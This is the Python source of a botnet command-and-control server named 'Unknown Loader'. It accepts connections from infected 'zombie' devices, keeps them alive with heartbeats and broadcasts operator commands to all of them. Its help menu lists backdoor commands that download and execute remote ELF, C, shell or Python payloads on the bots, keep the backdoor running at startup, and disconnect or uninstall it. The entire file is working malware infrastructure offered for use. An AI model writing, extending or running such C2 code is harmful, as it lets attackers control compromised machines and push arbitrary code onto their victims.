import sys, os, time, socket
import random, threading

_bots = []
_exit = threading.Event()

def _bdcast(_msg):
    # broadcast command to all clients
    global _bots
    for zombie in _bots:
        try:
            zombie.send(_msg.encode())
        except:
            # remove offline/dead device
            _update()
            _bots.remove(zombie)

    # if bot command was 'reconnect' clear and wait for queue repopulation
    # else purge bot queue entirely and await any new connections
    if ('reconnect' in _msg.lower() or 'disconnect' in _msg.lower() or 'uninstall' in _msg.lower()):
    	_bots.clear()
    	_update()

def _kalive():
    # keep-alive heartbeat
    global _exit, _bots
    while not _exit.is_set():
        if len(_bots) != 0:
            for zombie in _bots:
                try:
                    zombie.settimeout(5)
                    zombie.send('ping'.encode())
                except:
                    # remove offline/dead device
                    _bots.remove(zombie)

        _update()
        time.sleep(30)

def _listen():
    global _bots, _exit

    # execute heartbeat routine
    try:
        _h = threading.Thread(target=_kalive)
        _h.daemon = True
        _h.start()
    except:
        sys.exit('Critical error! Exiting...')

    # setup listener
    try:
        # bind to socket
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((sys.argv[1], int(sys.argv[2])))

        server.listen(10000) # 10K device backlog limit
    except socket.error:
        sys.exit('Failed to bind to port! Exiting...')

    # listen until program exit
    while not _exit.is_set():
        try:
            client, address = server.accept()
            _bots.append(client)
            # send infected device a welcome message
            client.send("Welcome!".encode())

            _update()
        except Exception as e:
            # device disconnect/rejected
            if 'client' in locals():
                _bots.remove(client)
                _update()

    _h.join()
    sys.exit()

def _update():
    global _bots
    try:
        # update terminal title
        _t = 'Unknown Loader 1.0  |  Listening @ ' + sys.argv[1] + ':' + sys.argv[2] + '  |  Bots: ' + str(len(_bots))
        sys.stdout.write(f"\x1b]2;{_t}\x07")
        sys.stdout.flush()
    except:
        pass

def main():
    global _exit
    os.system('clear')
    if len(sys.argv) != 3:
        sys.exit('Usage: <c2 ip-address> <c2 port>\r\n')
        
    # start listener
    try:
        _l = threading.Thread(target=_listen)
        _l.daemon = True
        _l.start()
    except:
        sys.exit('\r\nFailed to start listener! Exiting...\r\n')

    # main banner
    _update()
    _user = os.getlogin()
    banner = '''
     **************************************
     *           Unknown Loader           *
     *          Coded by ~Waived          *
     **************************************
'''
    print(banner)
    while True:
        try:
            # accept user commands
            option = input(_user + '@u-loader: ')
            if option.lower() == 'help':
                print('''
 Loader commands:
     clear                         = Refreshes C2 environment
     exit                          = Power-off C2 (safer CTRL+C alternative)
      
 Backdoor commands:
     disconnect                    = Terminate all C2 connections
     reconnect                     = Reset all C2 connections
     uninstall                     = Terminate connections + remove backdoor 
     exec <url to file> <filename> = Load/execute ELF, C, SH, or PY script on bots
     persist                       = Maintain backdoor connection at startup
''')
            elif option.lower() == 'clear':
                os.system('clear')
                print(banner)
            elif option.lower() == 'exit':
                _exit.set()
                print('\r\n Exiting...')
                break
            else:
                _bdcast(option)
        except KeyboardInterrupt:
            _exit.set()
            break
        except Exception as e:
            pass

    sys.exit('\r\n Thank you for using Unknown Loader! Goodbye :)')

if __name__ == "__main__":
    main()
